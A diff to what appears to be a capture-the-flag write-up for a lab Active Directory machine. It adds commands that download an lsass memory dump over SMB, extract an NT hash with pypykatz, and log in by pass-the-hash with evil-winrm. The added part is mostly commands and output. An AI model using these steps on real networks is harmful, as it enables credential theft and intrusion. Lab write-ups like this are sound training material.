@@ -113,7 +113,7 @@ rpcclient -U support $IP
 
 enumdomusers
 ```
-##### Reset some passwords
+##### Reset AD passwords
 https://room362.com/post/2017/reset-ad-user-password-with-linux/
 
 https://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse#forcechangepassword
@@ -129,3 +129,46 @@ rpcclient $> setuserinfo2 audit2020 23 'qwer1234!'
 rpcclient $> c
 ```
 
+### Go into a new smb share
+```bash
+smbmap -H $IP -u audit2020 -p 'qwer1234!'
+
+smbclient //$IP/forensic -U=audit2020%qwer1234!
+
+smbget -R smb://$IP/forensic/memory_analysis/lsass.zip -U=audit2020%qwer1234!
+```
+
+### Dump plaintext credentials and hashes from lsass.exe
+As anti-virus started catching on to that, attackers pivoted. A well known technique is to use procdump.exe from Sysinternals (and signed by Microsoft) to dump lsass.exe and then exfil that memory dump and extract hashes from it in the attacker controlled space.
+
+```bash
+unzip lsass.zip
+
+file lsass.DMP
+
+ls -lh lsass.DMP 
+
+pypykatz lsa minidump lsass.DMP
+
+INFO:root:Parsing file lsass.DMP
+FILE: ======== lsass.DMP =======
+== LogonSession ==
+authentication_id 406458 (633ba)
+session_id 2
+username svc_backup
+domainname BLACKFIELD
+logon_server DC01
+logon_time 2020-02-23T18:00:03.423728+00:00
+sid S-1-5-21-4194615774-2175524697-3563712290-1413
+luid 406458
+        == MSV ==
+                Username: svc_backup
+                Domain: BLACKFIELD
+                LM: NA
+                NT: 9658d1d1dcd9250115e2205d9f48400d
+```
+
+### User flag
+```bash
+evil-winrm -i $IP -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
+```
